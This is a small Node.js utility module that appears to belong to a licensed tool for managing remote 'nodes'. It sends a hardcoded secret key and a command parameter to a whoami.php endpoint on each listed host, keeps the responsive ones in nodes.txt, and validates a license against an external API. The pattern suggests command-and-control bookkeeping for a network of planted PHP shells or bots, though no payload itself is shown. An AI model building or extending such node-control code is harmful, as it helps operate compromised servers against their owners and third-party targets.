const fetch = require('node-fetch');
const fs = require('fs')


module.exports.check = async function (host, callback) {
    const token = new Buffer('4e2a5f729d156591784ac3313e9b5560').toString('base64');
    fetch(`http://${host}/whoami.php?key=${token}&command=mother`).then(async res=>{
        const response = JSON.parse(await res.text());
        if(response.type=='ok') callback(1, host);
    }).catch(e=>{
        console.log(e);
        callback(0, host, e);
    });
}

module.exports.checklicense = function (token, callback){
    fetch('https://api.void.cf/validate?token='+token).then(async res=>{
        callback(await res.text());
    });
}


module.exports.ReCheckNodes = function () {
    const {check} = require('./utils');
    fs.readFile('./nodes.txt', 'utf8' , (err, data) => {
        if (err) {console.error(err);return}
        fs.writeFile('./nodes.txt', ``, err => {})
        let nodes = data.split('\n'); nodes.pop();
        nodes.forEach(node => {
            check(node, function (status, host) {
                console.log(status, host);
                if (status == 1) {
                    fs.readFile('./nodes.txt', 'utf8', (err, data) => {
                        if (err) {console.error(err);return}
                        if (data.includes(host)) {return;} else {
                            fs.writeFile('./nodes.txt', `${host}\n`, {flag: 'a+'}, err => {
                                if (err) {console.error(err);return}
                            })
                        }
                    })
                }
            })
        })
    })
}